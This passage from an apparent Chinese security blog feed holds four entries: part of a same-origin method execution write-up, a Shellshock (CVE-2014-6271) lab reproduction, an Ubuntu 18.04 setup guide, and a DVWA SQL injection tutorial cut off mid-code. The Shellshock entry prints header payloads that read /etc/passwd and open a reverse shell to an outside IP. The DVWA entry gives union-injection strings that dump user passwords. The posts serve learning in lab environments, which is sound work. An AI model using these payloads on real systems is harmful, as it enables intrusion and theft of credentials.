<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$callback = $_GET[<span class="string">'callback'</span>];</span><br><span class="line">preg_match(<span class="string">"/\w+/i"</span>, $callback, $matches);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $matches[<span class="number">0</span>] . <span class="string">"();"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/script&gt;"</span>;</span><br></pre></td></tr></table></figure>

<p>提交数据的相关代码如下:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">UpdateProfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> username = <span class="built_in">document</span>.getElementById(<span class="string">'user'</span>).value;</span><br><span class="line">	<span class="keyword">var</span> email = <span class="built_in">document</span>.getElementById(<span class="string">'email'</span>).value;</span><br><span class="line">	<span class="keyword">var</span> message = <span class="built_in">document</span>.getElementById(<span class="string">'mess'</span>).value;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">window</span>.opener.document.getElementById(<span class="string">"email"</span>).innerHTML=<span class="string">"Email: "</span>+email;</span><br><span class="line">	<span class="built_in">window</span>.opener.document.getElementById(<span class="string">"mess"</span>).innerHTML=<span class="string">"Message: "</span>+message;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">"Update user profile success..."</span>);</span><br><span class="line">	<span class="built_in">window</span>.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">EditProfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">document</span>.onkeydown=<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (event.keyCode == <span class="number">13</span>)&#123;</span><br><span class="line">			UpdateProfile();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RandomProfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	setTimeout(<span class="string">'UpdateProfile()'</span>, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>当我们点击 change something 图标，触发函数edit():</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> newWin = <span class="built_in">window</span>.open(<span class="string">"./edit.php?callback=EditProfile"</span>,<span class="string">''</span>,<span class="string">'width=600,height=600'</span>);</span><br><span class="line">	<span class="keyword">var</span> loop = setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">	  <span class="keyword">if</span>(newWin.closed) &#123;  </span><br><span class="line">	    clearInterval(loop);  </span><br><span class="line">	    update();</span><br><span class="line">	  &#125;  </span><br><span class="line">	&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure>

<p>点击 click me 图标，则触发函数random():</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> newWin = <span class="built_in">window</span>.open(<span class="string">"./edit.php?callback=RandomProfile"</span>,<span class="string">''</span>,<span class="string">'width=600,height=600'</span>);</span><br><span class="line">	<span class="keyword">var</span> loop = setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">	  <span class="keyword">if</span>(newWin.closed) &#123;  </span><br><span class="line">	    clearInterval(loop);  </span><br><span class="line">	    update();</span><br><span class="line">	  &#125;  </span><br><span class="line">	&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure>

<p>明显random()打开的url中带有的 callback 参数值为 RandomProfile ，触发了edit.php 页面中的 RandomProfile() 函数</p>
<hr>
<p>参考文章:<br><a href="https://xiaix.me/fan-yi-wa-jue-tong-yuan-fang-fa-zhi-xing-lou-dong-same-origin-method-execution/" target="_blank" rel="noopener">https://xiaix.me/fan-yi-wa-jue-tong-yuan-fang-fa-zhi-xing-lou-dong-same-origin-method-execution/</a><br><a href="https://blog.csdn.net/yanghuan313/article/details/53829453" target="_blank" rel="noopener">https://blog.csdn.net/yanghuan313/article/details/53829453</a><br><a href="https://michaelwayneliu.github.io/2017/12/21/SOME攻击/" target="_blank" rel="noopener">https://michaelwayneliu.github.io/2017/12/21/SOME%E6%94%BB%E5%87%BB/</a><br><a href="http://files.benhayak.com/Same_Origin_Method_Execution__paper.pdf" target="_blank" rel="noopener">http://files.benhayak.com/Same_Origin_Method_Execution__paper.pdf</a></p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>SOME</tag>
      </tags>
  </entry>
  <entry>
    <title>Bash 远程代码执行漏洞(CVE-2014-6271)复现</title>
    <url>/2019/07/25/CVE/Bash%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="CGI"><a href="#CGI" class="headerlink" title="CGI"></a>CGI</h2><p>CGI全称是“公共网关接口”(Common Gateway Interface)，HTTP服务器与你的或其它机器上的程序进行“交谈”的一种工具，其程序须运行在网络服务器上。<br>CGI可以用任何一种语言编写，只要这种语言具有标准输入、输出和环境变量。<br>CGI环境变量列表:<br>    SERVER-NAME:运行CGI序为机器名或IP地址。<br>　　SERVER-INTERFACE:WWW服务器的类型，如:CERN型或NCSA型。<br>　　SERVER-PROTOCOL:通信协议，应当是HTTP/1.0。<br>　　SERVER-PORT:TCP端口，一般说来web端口是80。<br>　　HTTP-ACCEPT:HTTP定义的浏览器能够接受的数据类型。</p>
<a id="more"></a>
<p>　　HTTP-REFERER: 发送表单的文件URL。(并非所有的浏览器都传送这一变量)<br>　　HTTP-USER-AGENT:发送表单的浏览器的有关信息。<br>　　GETWAY-INTERFACE:CGI程序的版本，在UNIX下为 CGI/1.1。<br>　　PATH-TRANSLATED: PATH-INFO中包含的实际路径名。<br>　　PATH-INFO:浏览器用GET方式发送数据时的附加路径。<br>　　SCRIPT-NAME: CGI程序的路径名。<br>　　QUERY-STRING:表单输入的数据，URL中间号后的内容。<br>　　REMOTE-HOST:发送程序的主机名，不能确定该值。<br>　　REMOTE-ADDR:发送程序的机器的IP地址。<br>　　REMOTE-USER:发送程序的人名。<br>　　CONTENT-TYPE:POST发送，一般为applioation/xwww-form-urlencoded。<br>　　CONTENT-LENGTH:POST方法输入的数据的字节数</p>
<p>Web服务器可以解析(handles)HTTP协议。当Web服务器接收到一个HTTP请求(request)，会返回一个HTTP响应 (response)，例如送回一个HTML页面。为了处理一个请求(request)，Web服务器可以响应(response)一个静态页面或图片，进行页面跳转(redirect)，或者把动态响应(dynamic response)的产生委托(delegate)给一些其它的程序例如CGI脚本，JSP(JavaServer Pages)脚本，servlets，ASP(Active Server Pages)脚本，服务器端(server-side)JavaScript，或者一些其它的服务器端(server-side)技术。无论它们的目的如何，这些服务器端(server-side)的程序通常产生一个HTML的响应(response)来让浏览器可以浏览。</p>
<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p><img src="https://jerexw.sn.files.1drv.com/y4mzU0Q1uY8Rw5dxsaQvxAZFh93rbb-sjCJWdOcleAzpOc56fuhajS91OkpXYLY1ScCiITrOX-ujNbpU7uCWcrBoAf8Y5wnOamwB06abF_JOcpI2iV742B_fMazLJxL7AJ7mZ0_Afw2AroF8G2fVV--WJDFibmQd-9OM0mDuuLLZZSRvCk-6QUkNWi0LhL4URZMYwEtwta3CrT3xvmQuZqaxA?width=584&height=1074&cropmode=none" alt></p>
<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><blockquote>
<p>GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行shell命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。</p>
<p>此漏洞源于在调用bash shell之前可以用构造的值创建环境变量。这些变量可以包含代码，在shell被调用后会被立即执行。</p>
</blockquote>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://github.com/Medicean/VulApps/tree/master/b/bash/shellshock1_CVE-2014-6271" target="_blank" rel="noopener">https://github.com/Medicean/VulApps/tree/master/b/bash/shellshock1_CVE-2014-6271</a></p>
<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># docker pull medicean/vulapps:b_bash_shellshock1</span></span><br><span class="line"><span class="meta"># docker run -d -p 1000:80 medicean/vulapps:b_bash_shellshock1</span></span><br></pre></td></tr></table></figure>

<p>然后访问 http://[你的ip]:1000 即可</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol>
<li>点击页面上的 poc.cgi 后跳转到如图页面</li>
</ol>
<p><img src="https://jurdxw.sn.files.1drv.com/y4makO-Jc3JUis8HCaVgtNwgRHI965u-GHdNBMePLfX6FZGiAu3yIwHldNE2xyP5J907Fyx2iMADJ6rUx41NO6JCiOgQqq8jQQv6VRlzfewlYWifaAVA5dVA5l2ENOZbH0VbNP5H5gwPFpKMN8DlnOq77AgPgVRPudv1rB4gIzO1IG_ij_9s78V-EFI9jbKj4IrizCFpjpelY3gdMG24gnGjA?width=876&height=459&cropmode=none" alt></p>
<p>明显返回的是 cgi 环境变量</p>
<ol start="2">
<li>bp抓包</li>
</ol>
<p><img src="https://jerjxw.sn.files.1drv.com/y4mGY8bSlrLVhZiCIKUIjFkFN4zkmk1dKkawA-zDRBPZMiY5nomqrnOGTb7H-Xc8E8QJR1E_gzUTXBzChCqDdnHr8IEkmSA8en7siN3kH6LRBQ1Mxw45-9S8ieh93e3gsPhmXme0bfz6mgEGAWqBqhdd9VfT8qbbpwMdmt5twobcVow9jQcH2immk9tJUE58uB0YF12td37jVdoCwt_EoLmBg?width=1262&height=785&cropmode=none" alt></p>
<ol start="3">
<li>将http头中除GET之外的某一处数据改为<code>() { :;}; echo ;echo ;echo 123;</code></li>
</ol>
<p>例如:<code>User-Agent: () { :;}; echo ;echo ;echo 123;</code>然后发包</p>
<p><img src="https://jerixw.sn.files.1drv.com/y4myS7owqdmOdMpV_BjLd0MDwBRvKDzXq2lHkKsPpKZKJYm1NBm-QQ1txU1-KNkotLG5Ki7R4BELOp1G0sVO8rBeNj-UFNtP1rnARguG_R-kqO8S_QSiiTg-IMCciykqztlf8VaeKGhHNrBov5Vpss4WnsNcCqw0t-FUSNjCp_w-p3wjPN5CvWcaCh8IrNrcM6uEP_ZS5MbPVw8Zw37RmbIiQ?width=1915&height=932&cropmode=none" alt></p>
<p>发现命令执行成功了</p>
<ol start="4">
<li>然后测试执行系统命令<code>() { :;}; echo ;echo ;echo $(/bin/cat /etc/passwd);</code></li>
</ol>
<p><img src="https://jerhxw.sn.files.1drv.com/y4m3avDf5z1yuhbp6JGIoA6TRYPqr23TePT-XJD4tRbHDmKyPa0bH8nZHd5iChzik6XRtwxL2TZee_3uAqTX_pdCZF-uSpeqAxkkgKu5F5047GLcsoyIL3wH-bj2n34gGGEqGIzHr3oe1I_okAhIyvHi1vyHtindHYlT_dqsxOuoYKnGmGpvrezvqAYc8qf5GXvsR-4YpLK9D9sjbu_pKANTQ?width=1251&height=763&cropmode=none" alt></p>
<p>明显执行成功</p>
<ol start="5">
<li>那么弹shell也不在话下<code>() { :;}; /bin/bash -i &gt;&amp; /dev/tcp/[弹到你的公网ip]/[端口号] 0&gt;&amp;1;</code></li>
</ol>
<p><img src="https://jergxw.sn.files.1drv.com/y4mAl-bLF4eNEkLoyPQLLkgHKMF4LxU_302AYKh3ZOvU5i6YzDh-4Lf13g5DEHhZIXso9pf_WME-aZYHrD90lGJI9OesfH8fx1gCmtCKwmiq_UVZjrguCRgs1pwOuEFHmwWlUkfDwJGxHWE4pFw80p-4ofj08FQz0iG28lud-VtjeBv8KWlNPVHJa-Jtx34x7v4EFBDd2APUmkx_AnhrUnHEA?width=1327&height=334&cropmode=none" alt></p>
<p>   测试成功</p>
<ol start="6">
<li><p>来自官方说明:部分嵌入式设备的环境变量未设置会导致一些命令需要使用绝对路径，可在执行命令前导入环境变量</p>
<p><code>User-Agent: () { :;};echo ; echo; export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; echo $(/bin/ls -al /);</code></p>
</li>
</ol>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>进入到环境中<code>docker exec -it dazzling_tu /bin/bash</code><br>进入poc.cgi所在目录<code>cd /usr/local/apache2/cgi-bin</code><br>查看poc.cgi的内容<code>cat poc.cgi</code></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Content-type: text/html"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;html&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;head&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;title&gt;Bash ShellShock&lt;/title&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/head&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;body&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;pre&gt;'</span></span><br><span class="line">/usr/bin/env</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/pre&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/body&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/html&gt;'</span></span><br></pre></td></tr></table></figure>

<p>漏洞就是在这里<code>/usr/bin/env</code>产生的</p>
<p>大致流程如下:</p>
<blockquote>
<ol>
<li>HTTP 头参数传入</li>
<li>env 环境变量接受到参数</li>
<li>bash 执行环境变量中的字符串(黑客构造好的 payload 在这里执行)</li>
<li>结果保存在当前会话的环境变量中随着 response 返回到客户端</li>
<li>黑客愉快的进下一步操作</li>
</ol>
</blockquote>
<p>经验+1:扫到/cgi-bin/ .cgi .sh 等目录或文件可以进行有关bash代码注入的测试</p>
<p>payload: <code>() { :;}; echo ; echo ; echo &quot;this test is success!&quot;;</code></p>
<p>参考文章:<br><a href="https://github.com/Medicean/VulApps/blob/master/b/bash/shellshock1_CVE-2014-6271/README.md" target="_blank" rel="noopener">https://github.com/Medicean/VulApps/blob/master/b/bash/shellshock1_CVE-2014-6271/README.md</a><br><a href="https://www.cnblogs.com/qmfsun/p/7591757.html" target="_blank" rel="noopener">https://www.cnblogs.com/qmfsun/p/7591757.html</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>远程代码执行</tag>
        <tag>cgi</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu1804 折腾全集</title>
    <url>/2019/06/27/Ubuntu1804%20%E6%8A%98%E8%85%BE%E5%85%A8%E9%9B%86/</url>
    <content><![CDATA[<h1 id="安装-Ubuntu1804"><a href="#安装-Ubuntu1804" class="headerlink" title="安装 Ubuntu1804"></a>安装 Ubuntu1804</h1><h2 id="下载系统镜像"><a href="#下载系统镜像" class="headerlink" title="下载系统镜像"></a>下载系统镜像</h2><p><a href="https://ubuntu.com/download/desktop" title="官方下载地址" target="_blank" rel="noopener">https://ubuntu.com/download/desktop</a></p>
<h2 id="安装系统"><a href="#安装系统" class="headerlink" title="安装系统"></a>安装系统</h2><ol>
<li>将下载到的镜像用 Win32DiskImager 等镜像写入工具写入到一个足够大小的 U 盘上</li>
<li>安装时选择 U 盘启动，跟着引导一步一步往下走</li>
<li>磁盘分区: 清空整个磁盘为将整块磁盘格式化后安装系统，盘上还有资料的不要选；自定义分区，可以参考这盘文章<a href="https://blog.csdn.net/u012052268/article/details/77145427/" target="_blank" rel="noopener">https://blog.csdn.net/u012052268/article/details/77145427/</a>或者自己百度，要注意分完区要选择引导的安装位置，一般是你所安装的这块磁盘，而不是boot分区！！！</li>
<li>然后就等着安装完成重启电脑就 OK 了</li>
</ol>
<h2 id="如果你是-Nvidia-用户"><a href="#如果你是-Nvidia-用户" class="headerlink" title="(如果你是 Nvidia 用户)"></a>(如果你是 Nvidia 用户)</h2><blockquote>
<p>如果你是 Nvidia 用户，那么恭喜你，你会发现重启电脑进入系统卡死在 logo 页面死活进不去系统<br>这是因为 linux 系统的 nauveau 开源显卡驱动的原因，解决方案如下:<br>引导时先选到进入系统的选项，按 e 键，找到倒数第二行的 quiet splash ，在后面添加 acpi_osi=linux nomodeset(splash后面别忘了加个空格哈) 再按 ctrl+x 引导即可进入系统。<br>进入系统后打开软件更新器，找到附加驱动，它会检测你合适的官方驱动，找一个稳定的安装就行了。</p>
</blockquote>
<h1 id="优化你的-Ubuntu"><a href="#优化你的-Ubuntu" class="headerlink" title="优化你的 Ubuntu"></a>优化你的 Ubuntu</h1><h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><p>国内用户第一件事一定要换源！换源！换源！<br>先备份一下默认源</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo <span class="regexp">/etc/</span>apt<span class="regexp">/sources.list /</span>etc<span class="regexp">/apt/</span>sources.list.bak</span><br></pre></td></tr></table></figure>

<p>然后用下面的源替换掉原来的源</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">sudo <span class="keyword">vi</span> /etc/apt/sources.<span class="keyword">list</span></span><br></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial main</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial main</span><br><span class="line"></span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-updates main</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-updates main</span><br><span class="line"></span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial universe</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial universe</span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-updates universe</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-updates universe</span><br><span class="line"></span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-security main</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-security main</span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-security universe</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-security universe</span><br></pre></td></tr></table></figure>

<p>然后更新</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> update</span><br><span class="line">sudo apt-<span class="builtin-name">get</span> upgrade</span><br><span class="line">sudo apt-<span class="builtin-name">get</span> -f install</span><br></pre></td></tr></table></figure>

<h2 id="安装常用软件-环境"><a href="#安装常用软件-环境" class="headerlink" title="安装常用软件 环境"></a>安装常用软件 环境</h2><ul>
<li><p>vim</p>
<p><code>sudo apt-get install vim</code></p>
</li>
<li><p>gedit</p>
<p><code>sudo apt-get install gedit</code></p>
</li>
<li><p>ssh</p>
<p><code>sudo apt-get install ssh</code></p>
</li>
<li><p>apache</p>
<p><code>sudo apt-get install apache2</code></p>
</li>
<li><p>mysql</p>
<p><code>sudo apt-get install mysql-server</code></p>
</li>
<li><p>pycharm</p>
<p>商店里面搜索就可以下载</p>
</li>
<li><p>vscode</p>
<p>商店里搜索</p>
</li>
<li><p>网易云音乐</p>
<p>去官网下载安装包，双击安装</p>
</li>
<li><p>qq 微信 百度网盘 迅雷等(有些必要的运行库可能会与系统冲突，慎重)</p>
<p><a href="https://github.com/AbelChe/deepin-wine-ubuntu" target="_blank" rel="noopener">https://github.com/AbelChe/deepin-wine-ubuntu</a></p>
</li>
<li><p>docker</p>
<p><code>sudo apt-get install docker docker.io docker-compose</code></p>
</li>
</ul>
<h1 id="美化"><a href="#美化" class="headerlink" title="美化"></a>美化</h1><p><a href="https://www.jianshu.com/p/f9e905abea91" target="_blank" rel="noopener">https://www.jianshu.com/p/f9e905abea91</a>差不多了</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>Ubuntu</tag>
        <tag>美化</tag>
        <tag>配置环境</tag>
      </tags>
  </entry>
  <entry>
    <title>利用DVWA进行简单的漏洞学习</title>
    <url>/2019/04/25/%E5%88%A9%E7%94%A8DVWA%E8%BF%9B%E8%A1%8C%E7%AE%80%E5%8D%95%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><h2 id="Low-Level"><a href="#Low-Level" class="headerlink" title="Low Level"></a>Low Level</h2><h3 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>在输入框中输入1，然后提交<br>得到如下内容<br><img src="https://sawvsg.bn.files.1drv.com/y4mPaxBNf7c6hbB6aYNDT1sJHWgI_xKoHA5blVRONulxCxy0OVOFZiewYCc8ug86Y9xGe4MMLwJ5Xh39ioUkevQ-UwfX6O3Ss0DulnJCKpQ6x8eDihDFAaj-hrVJ9lvQqVPrDfO0DTdSxjFKgtk1ca-Km-PgA0NU8Xl3vaj491Lt98zN284L-EoiUTtIXDXDPxEG4a5idDqhv-zv3xpUHZFgA?width=281&height=95&cropmode=none" width="281" height="95"><br>输入1’，提交得到<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;&#39; at line 1</code><br>说明存在字符型的SQL注入。</p>
<h3 id="猜解字段数"><a href="#猜解字段数" class="headerlink" title="猜解字段数"></a>猜解字段数</h3><p>通过<code>order by</code>进行猜解字段数<br><code>1&#39; order by 1#</code>正常<br><code>1&#39; order by 2#</code>正常<br><code>1&#39; order by 3#</code>返回错误<br>说明查询的字段数是两个<br>那么查询语句的结构差不多就是<code>select &lt;name1&gt;,&lt;name2&gt; from &lt;table&gt; where &lt;id&gt;=&lt;value&gt;;</code></p>
<h3 id="尝试爆出所有字段"><a href="#尝试爆出所有字段" class="headerlink" title="尝试爆出所有字段"></a>尝试爆出所有字段</h3><p>那么我们可以尝试构造<code>1&#39; or &#39;1&#39;=&#39;1</code>来爆出所查询的表里的所有字段(因为是字符型注入，所以要考虑引号的闭合)<br><img src="https://sawtsg.bn.files.1drv.com/y4mYZKTtiGH602vL3dUx6Wefx1Frvo3AjwFW3qoOWTaNH6iclFgqni4PrHcBIHyt2owWmSNv77nHS5KPPBTsAo9lLDmAzCGbekWRHW3DVAQCxN9fdJ8rnJCC4189jol_LxN5Ig55fJsvOfHuWUSGuf4rxaj7xNHtHWx60O9FzKJSZZTsP7eqCLuJAgz0gRwAC7v23Fw96pa9gMswqQp4BWIHQ?width=284&height=327&cropmode=none" width="284" height="327"><br>还原成SQL语句即为<code>select &lt;name1&gt;,&lt;name2&gt; from &lt;table&gt; where &lt;id&gt;=1 or 1=1;</code></p>
<h3 id="union拼接查询敏感信息"><a href="#union拼接查询敏感信息" class="headerlink" title="union拼接查询敏感信息"></a>union拼接查询敏感信息</h3><p>使用联合查询 union 可以爆出我们想知道的一些数据库敏感信息<br><a href="https://www.jianshu.com/p/ea15158f39f7" target="_blank" rel="noopener">关于MySQL的information_schema库</a><br>爆出数据库名</p>
<p><code>1&#39; union select database(),2;#</code><br><img src="https://sawwsg.dm.files.1drv.com/y4mLzUEkcM3F3ydTzBNwS5hch-OJZ2GS11vrq3meDkq2z80U4f8Lv1lU6gnYEkInUXiVSx0PhiuQ0uVzx3Tp_IFzNAvHdRFWWf8YK0o2ov588sjBnqCO-nreiM6-4kipDzVsN7vqLAQ6dGxKlRWZ36QOhFDgxwf6ehfm7WKUqP-YNWA6y-h4kCWzEf_WZ-xNx2kYPXaee44m-Fa_BAg_uWdQw?width=285&height=149&cropmode=none" width="285" height="149"><br>爆出数据库表<br><code>1&#39; union select 1,table_name from information_schema.tables where table_schema=&#39;dvwa&#39;#</code><br><img src="https://sqwnsg.by.files.1drv.com/y4mSW--M2dh7VCFFAS4jsUGgGEjKLGm105uI78kieOyS15UB_gT7lpuI93eFE7rZSv35tBOeWWsIIVsd1H8tEkrH-oKVQn8apNPdGzNTS-LIKcQ4915UaoTd9iGyAiJoJblJU2yxlb9vGpp0kIVA9z1QSXFbmVbK6koHISQg7Lm-91LLwWIMmFPhMThWuc5Q2rnovRp6fweZDNpNS2ZzBUAMA?width=610&height=209&cropmode=none" width="610" height="209"><br>爆出表中的所有列<br><code>1&#39; union select 1,column_name from information_schema.columns where table_name=&#39;users&#39;#</code><br><img src="https://sqwosg.bn.files.1drv.com/y4mmkEAtD0FfoKaTcBldPkG19MwAhILObO7FAemlmHAf4JhRAlarTEd8h6DaL7ftwwnB6tOjpdB7su6-SAUZiXlZqbAoq1RcjydrHbmMlX9INiuuco1vhg33KXyEHXNFa-8WJoBFqZLqSC_ndYnx5pye0SLgyXCSdOdrMAPP-WNds4h7pxtFC2y8k7t-EpgHcukRpNKRnIp4ms3aiXUJkrnag?width=621&height=554&cropmode=none" width="621" height="554"><br>查出用户名和密码<br><code>1&#39; union select user,password from users#</code><br><img src="https://sawusg.dm.files.1drv.com/y4mVcVCtinKTUMlh3Eoy9Jf0SfmEtW9GdMUMzb3ZTPx64uzVOjGyyrVDlFMar1UcWf2MzSFSJ0HBzEDCtM1ra9xUfAMZt3FG-bOhOTXbE_WWpTZyY0n0gZr-V7_vfBna3qBGac7QVO2lo5XaA_Vo7awnfb42_o-D2cwFdUsFIkZw0gHDT664i2zGgeptuNi4a8kkIRloRj80-Eh9sYpK0z4Ig?width=380&height=382&cropmode=none" width="380" height="382"></p>
<h3 id="审计源码和总结"><a href="#审计源码和总结" class="headerlink" title="审计源码和总结"></a>审计源码和总结</h3><p>源码如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">'Submit'</span> ] ) ) &#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// Get input</span></span></span><br><span class="line"><span class="php">    $id = $_REQUEST[ <span class="string">'id'</span> ];</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">// Check database</span></span></span><br><span class="line"><span class="php">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span></span><br><span class="line"><span class="php">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">// Get results</span></span></span><br><span class="line"><span class="php">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// Get values</span></span></span><br><span class="line"><span class="php">        $first = $row[<span class="string">"first_name"</span>];</span></span><br><span class="line"><span class="php">        $last  = $row[<span class="string">"last_name"</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="comment">// Feedback for end user</span></span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span 